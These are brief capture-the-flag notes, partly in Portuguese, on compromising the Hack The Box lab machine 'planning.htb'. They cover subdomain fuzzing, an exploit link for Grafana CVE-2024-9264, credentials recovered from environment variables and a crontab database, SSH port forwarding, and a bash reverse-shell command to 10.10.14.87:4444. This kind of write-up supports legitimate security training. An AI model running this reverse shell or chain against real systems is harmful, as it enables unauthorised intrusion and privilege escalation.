nmap: 22,80

ffuf -w /seclist/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.planning.htb" -u http://planning.htb/ -fc 301: grafana

grafana CVE-2024-9264
https://github.com/nollium/CVE-2024-9264

env
ele da login e senha do enzo

ssh enzo@ip
ja obitivemos a user.txt


cat /opt/crontabs/crontab.db

netstat -tuln
sh -L 8000:127.0.0.1:8000 enzo@planning.htb
root:senha do crontabs

/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'
terminado com a flag root


